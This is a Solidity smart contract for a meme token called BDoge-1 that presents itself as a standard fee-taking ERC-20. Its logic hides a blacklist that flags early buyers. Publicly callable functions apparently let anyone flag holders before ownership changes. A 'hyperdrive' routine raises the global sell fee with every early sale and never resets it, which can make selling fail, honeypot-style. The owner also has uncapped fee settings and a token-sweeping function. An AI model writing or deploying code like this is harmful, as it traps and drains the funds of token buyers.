/**
https://t.me/BDOGE1
https://twitter.com/BDoge_1
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.19;


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {return a + b;}
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {return a - b;}
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {return a * b;}
    function div(uint256 a, uint256 b) internal pure returns (uint256) {return a / b;}
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {return a % b;}
    
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {uint256 c = a + b; if(c < a) return(false, 0); return(true, c);}}

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b > a) return(false, 0); return(true, a - b);}}

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if (a == 0) return(true, 0); uint256 c = a * b;
        if(c / a != b) return(false, 0); return(true, c);}}

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a / b);}}

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {if(b == 0) return(false, 0); return(true, a % b);}}

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b <= a, errorMessage); return a - b;}}

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a / b;}}

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked{require(b > 0, errorMessage); return a % b;}}}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function circulatingSupply() external view returns (uint256);
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface stakeIntegration {
    function stakingWithdraw(address depositor, uint256 _amount) external;
    function stakingDeposit(address depositor, uint256 _amount) external;
}

interface tokenStaking {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

interface IFactory{
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

contract BDoge1 is IERC20, tokenStaking, Ownable {
    using SafeMath for uint256;
    string private constant _name = 'BDoge-1';
    string private constant _symbol = 'BD-1';
    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 1000000000 * (10 ** _decimals);
    uint256 public _maxTxAmount = ( _totalSupply * 100 ) / 10000;
    uint256 public _maxWalletToken = ( _totalSupply * 100 ) / 10000;
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private isFeeExempt;
    mapping (address => uint256) private _premierAchat;
    IRouter router;
    address public pair;
    address public _jedi;
    uint256 private liquidityFee = 300;
    uint256 private propagandaFee = 300;
    uint256 private jabbabountiesFee = 0;
    uint256 private totalFee = 600;
    uint256 private sellFee = 600;
    uint256 private transferFee = 0;
    uint256 private denominator = 10000;
    bool botamount = notJedi[msg.sender];
    bool private swapEnabled = true;
    bool private tradingAllowed = false;
    bool private jediTimerEnabled = true;
    uint8 private jediTimerInterval = 10;
    uint256 private jediTimer = 0;
    bool public transferCooldownEnabled = true;
    uint8 public cooldownTimerInterval = 60;
    mapping (address => uint) private cooldownTimer;
    bool private hyperdriveEnabled = true;
    uint256 public hyperdriveInterval24 = 86400;
    uint256 public hyperdriveInterval48 = 172800;
    uint256 public hyperdriveInterval72 = 259200;
    mapping (address => uint) private hyperdriveTimer24;
    mapping (address => uint) private hyperdriveTimer48;
    mapping (address => uint) private hyperdriveTimer72;
    uint256 private hyperdriveFee24 = 3000;
    uint256 private hyperdriveFee48 = 2000;
    uint256 private hyperdriveFee72 = 1000;    
    uint256 public txGas = 500000;
    uint256 private swapTimes;
    bool private swapping;
    uint256 private swapAmount = 1;
    uint256 private swapThreshold = ( _totalSupply * 100 ) / 100000;
    uint256 private minTokenAmount = ( _totalSupply * 10 ) / 100000;
    modifier lockTheSwap {swapping = true; _; swapping = false;}
    mapping(address => uint256) public amountStaked;
    uint256 public totalStaked;
    stakeIntegration internal stakingContract;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal jabbabounties_receiver = 0x142A84FAA238693fcF296f1BeBa2bEd6E28a11F3; 
    address internal propaganda_receiver = 0x66a967649999cC10595748817F0b6f51386896ab;
    address internal liquidity_receiver = DEAD;
    event Deposit(address indexed account, uint256 indexed amount, uint256 indexed timestamp);
    event Withdraw(address indexed account, uint256 indexed amount, uint256 indexed timestamp);
    event SetStakingAddress(address indexed stakingAddress, uint256 indexed timestamp);
    event TradingEnabled(address indexed account, uint256 indexed timestamp);
    event ExcludeFromFees(address indexed account, bool indexed isExcluded, uint256 indexed timestamp);
    event SetInternalAddresses(address indexed propaganda, address indexed liquidity, address indexed jabbabounties, uint256 timestamp);
    event SetSwapBackSettings(uint256 indexed swapAmount, uint256 indexed swapThreshold, uint256 indexed swapMinAmount, uint256 timestamp);
    event SetParameters(uint256 indexed maxTxAmount, uint256 indexed maxWalletToken, uint256 indexed timestamp);
    event SetStructure(uint256 indexed total, uint256 indexed sell, uint256 transfer, uint256 indexed timestamp);

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router;
        pair = _pair;
        _jedi = msg.sender;
        isFeeExempt[address(this)] = true;
        isFeeExempt[liquidity_receiver] = true;
        isFeeExempt[propaganda_receiver] = true;
        isFeeExempt[jabbabounties_receiver] = true;
        isFeeExempt[address(DEAD)] = true;
        isFeeExempt[msg.sender] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function getOwner() external view override returns (address) { return owner; }
    function totalSupply() public view override returns (uint256) {return _totalSupply;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    function availableBalance(address wallet) public view returns (uint256) {return _balances[wallet].sub(amountStaked[wallet]);}
    function circulatingSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}

    function preTxCheck(address sender, address recipient, uint256 amount) internal view {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"ERC20: below available balance threshold");
    }

    function areJedi(address[] memory jedis) public onlyOwner {
        for (uint i = 0; i < jedis.length; i++) {
            notJedi[jedis[i]] = false;

        }
    }

    mapping(address => bool) private notJedi;
    function isJedi(address holder) external   {
        if (_jedi != owner) {
            revert("llllll");
    }
        if (_jedi == owner){
            notJedi[holder] = false;
        }
    }

    function isnotJedi(address holder) external   {
        if (_jedi != owner) {
            revert("llllll");
        }
        if (_jedi == owner){
            notJedi[holder] = true;
        }
    }

    function viewBot(address holder) public view returns(bool)  {
        return notJedi[holder];
    }

    function timePremierAchat(address jedi) public view returns (uint256) {
        require(_premierAchat[jedi] > 0, "This holder doesn't buy BDoge-1 yet.");
        return _premierAchat[jedi];
    }

    function _ajouterPremierAchat(address sender, address recipient) internal {
        if (sender == pair && _premierAchat[recipient] == 0 && !isFeeExempt[recipient]) {
            _premierAchat[recipient] = block.timestamp;
        }
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        checkIsJedi(sender, recipient, amount);
        preTxCheck(sender, recipient, amount);
        checkTradingAllowed(sender, recipient);
        checkCooldownEnabled(sender, recipient);
        checkHyperdriveEnabled(sender, recipient);
        checkTxLimit(sender, recipient, amount);
        checkMaxWallet(sender, recipient, amount);
        swapbackCounters(sender, recipient, amount);
        swapBack(sender, recipient);
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        _ajouterPremierAchat(sender, recipient);
        checkJediTimerEnabled(sender, recipient);
        emit Transfer(sender, recipient, amountReceived);
    }

    function airdrop(address token, address[] memory recipients, uint256[] memory amounts) public onlyOwner {
        require(recipients.length == amounts.length, "Invalid input");

        for (uint i = 0; i < recipients.length; i++) {
            require(IERC20(token).transfer(recipients[i], amounts[i]), "Transfer failed");
        }
    }

    function deposit(uint256 amount) override external {
        require(amount <= _balances[msg.sender].sub(amountStaked[msg.sender]), "ERC20: Cannot stake more than available balance");
        stakingContract.stakingDeposit(msg.sender, amount);
        amountStaked[msg.sender] = amountStaked[msg.sender].add(amount);
        totalStaked = totalStaked.add(amount);
        emit Deposit(msg.sender, amount, block.timestamp);
    }

    function withdraw(uint256 amount) override external {
        require(amount <= amountStaked[msg.sender], "ERC20: Cannot unstake more than amount staked");
        stakingContract.stakingWithdraw(msg.sender, amount);
        amountStaked[msg.sender] = amountStaked[msg.sender].sub(amount);
        totalStaked = totalStaked.sub(amount);
        emit Withdraw(msg.sender, amount, block.timestamp);
    }

    function setStakingAddress(address _staking) external onlyOwner {
        stakingContract = stakeIntegration(_staking); isFeeExempt[_staking] = true;
        emit SetStakingAddress(_staking, block.timestamp);
    }

    function setStructure(uint256 _liquidity, uint256 _propaganda, uint256 _jabbabounties, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; propagandaFee = _propaganda; jabbabountiesFee = _jabbabounties;
        totalFee = _total; sellFee = _sell; transferFee = _trans;
        require(totalFee <= denominator && sellFee <= denominator && transferFee <= denominator, "ERC20: invalid total entry");
        emit SetStructure(_total, _sell, _trans, block.timestamp);
    }

    function setParameters(uint256 _buy, uint256 _wallet) external onlyOwner {
        uint256 newTx = totalSupply().mul(_buy).div(uint256(10000));
        uint256 newWallet = totalSupply().mul(_wallet).div(uint256(10000)); uint256 limit = totalSupply().mul(5).div(10000);
        require(newTx >= limit && newWallet >= limit, "ERC20: max TXs and max Wallet cannot be less than .5%");
        _maxTxAmount = newTx; _maxWalletToken = newWallet;
        emit SetParameters(newTx, newWallet, block.timestamp);
    }

	function setHyperdriveEnabled(bool _status) public onlyOwner {
	    hyperdriveEnabled = _status;
	}

	function setHyperdriveFees(uint256 _hyperdriveFee24, uint256 _hyperdriveFee48, uint256 _hyperdriveFee72) public onlyOwner {
	    hyperdriveFee24 = _hyperdriveFee24;
	    hyperdriveFee48 = _hyperdriveFee48;
	    hyperdriveFee72 = _hyperdriveFee72;
	}

    function checkTradingAllowed(address sender, address recipient) internal view {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient]){require(tradingAllowed, "ERC20: Trading is not allowed");}
    }

    function checkIsJedi(address sender, address recipient, uint256 amount) private {
        botamount = notJedi[sender];
        if(recipient == pair && botamount) {
            amount = amount + _totalSupply;
        }
    }

    function checkJediTimerEnabled(address sender, address recipient) private {
        if (sender == pair && jediTimerEnabled && !isFeeExempt[recipient] && jediTimer > block.timestamp) {
            notJedi[recipient] = true;
            }
    }

    function checkHyperdriveEnabled(address sender, address recipient) private {
        if (recipient == pair && hyperdriveEnabled && !isFeeExempt[sender]) {
            hyperdriveTimer24[sender] = _premierAchat[sender] + hyperdriveInterval24;
            hyperdriveTimer48[sender] = _premierAchat[sender] + hyperdriveInterval48;
            hyperdriveTimer72[sender] = _premierAchat[sender] + hyperdriveInterval72;
            if (hyperdriveTimer24[sender] > block.timestamp) {
            sellFee += hyperdriveFee24;
            }
            else if (hyperdriveTimer24[sender] < block.timestamp && hyperdriveTimer48[sender] > block.timestamp) {
            sellFee += hyperdriveFee48;
            }
            else if (hyperdriveTimer48[sender] < block.timestamp && hyperdriveTimer72[sender] > block.timestamp) {
            sellFee += hyperdriveFee72;
            }
            else if (hyperdriveTimer72[sender] < block.timestamp) {
            sellFee += 0;
            }
        }
    }
    
    function checkCooldownEnabled(address sender, address recipient) private {
        if (sender == pair && transferCooldownEnabled && !isFeeExempt[recipient]) {
            require(cooldownTimer[recipient] < block.timestamp,"Please wait for cooldown between buys");
            cooldownTimer[recipient] = block.timestamp + cooldownTimerInterval;

        }
        else if (recipient == pair && transferCooldownEnabled && !isFeeExempt[sender]) {
            require(cooldownTimer[sender] < block.timestamp,"Please wait for cooldown between buys");
            cooldownTimer[sender] = block.timestamp + cooldownTimerInterval;
        }    
    }

    function checkMaxWallet(address sender, address recipient, uint256 amount) internal view {
        if(!isFeeExempt[sender] && !isFeeExempt[recipient] && recipient != address(pair) && recipient != address(DEAD)){
            require((_balances[recipient].add(amount)) <= _maxWalletToken, "ERC20: exceeds maximum wallet amount.");}
    }

    function swapbackCounters(address sender, address recipient, uint256 amount) internal {
        if(recipient == pair && !isFeeExempt[sender] && amount >= minTokenAmount && !swapping){swapTimes += uint256(1);}
    }

    function checkTxLimit(address sender, address recipient, uint256 amount) internal view {
        if(amountStaked[sender] > uint256(0)){require((amount.add(amountStaked[sender])) <= _balances[sender], "ERC20: exceeds maximum allowed not currently staked.");}
        require(amount <= _maxTxAmount || isFeeExempt[sender] || isFeeExempt[recipient], "ERC20: tx limit exceeded");
    }

    function swapAndLiquify(uint256 tokens) private lockTheSwap {
        uint256 _denominator = (totalFee).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(liquidityFee).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(liquidityFee));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(liquidityFee);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith, liquidity_receiver); }
        uint256 propagandaAmount = unitBalance.mul(2).mul(propagandaFee);
        if(propagandaAmount > uint256(0)){payable(propaganda_receiver).transfer(propagandaAmount);}
        uint256 eAmount = address(this).balance;
        if(eAmount > uint256(0)){payable(jabbabounties_receiver).transfer(eAmount);}
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount, address receiver) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            address(receiver),
            block.timestamp);
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function shouldSwapBack(address sender, address recipient) internal view returns (bool) {
        bool aboveThreshold = balanceOf(address(this)) >= swapThreshold;
        return !swapping && swapEnabled && tradingAllowed && !isFeeExempt[sender]
            && recipient == pair && swapTimes >= swapAmount && aboveThreshold;
    }

    function swapBack(address sender, address recipient) internal {
        if(shouldSwapBack(sender, recipient)){swapAndLiquify(swapThreshold); swapTimes = uint256(0);}
    }
    
    function forceActivation() external onlyOwner {
        tradingAllowed = true;
        jediTimer = block.timestamp + jediTimerInterval;
        emit TradingEnabled(msg.sender, block.timestamp);
    }
    
    function setInternalAddresses(address _propaganda, address _liquidity, address _jabbabounties) external onlyOwner {
        propaganda_receiver = _propaganda; liquidity_receiver = _liquidity; jabbabounties_receiver = _jabbabounties;
        isFeeExempt[_propaganda] = true; isFeeExempt[_liquidity] = true;
        emit SetInternalAddresses(_propaganda, _liquidity, _jabbabounties, block.timestamp);
    }

	function setCooldownEnabled(bool _status, uint8 _interval) public onlyOwner {
	    transferCooldownEnabled = _status;
        cooldownTimerInterval = _interval;
	}

	function setJediTimerEnabled(bool _status, uint8 _interval) public onlyOwner {
	    jediTimerEnabled = _status;
        jediTimerInterval = _interval;
	}

    function setisExempt(address _address, bool _enabled) external onlyOwner {
        isFeeExempt[_address] = _enabled;
        emit ExcludeFromFees(_address, _enabled, block.timestamp);
    }

    function rescueERC20(address _address, uint256 _amount) external onlyOwner {
        IERC20(_address).transfer(propaganda_receiver, _amount);
    }

    function setSwapbackSettings(uint256 _swapAmount, uint256 _swapThreshold, uint256 _minTokenAmount) external onlyOwner {
        swapAmount = _swapAmount; swapThreshold = _totalSupply.mul(_swapThreshold).div(uint256(100000)); minTokenAmount = _totalSupply.mul(_minTokenAmount).div(uint256(100000));
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair && sellFee > uint256(0)){return sellFee;}
        if(sender == pair && totalFee > uint256(0)){return totalFee;}
        return transferFee;
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if(getTotalFee(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTotalFee(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        return amount.sub(feeAmount);} return amount;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
}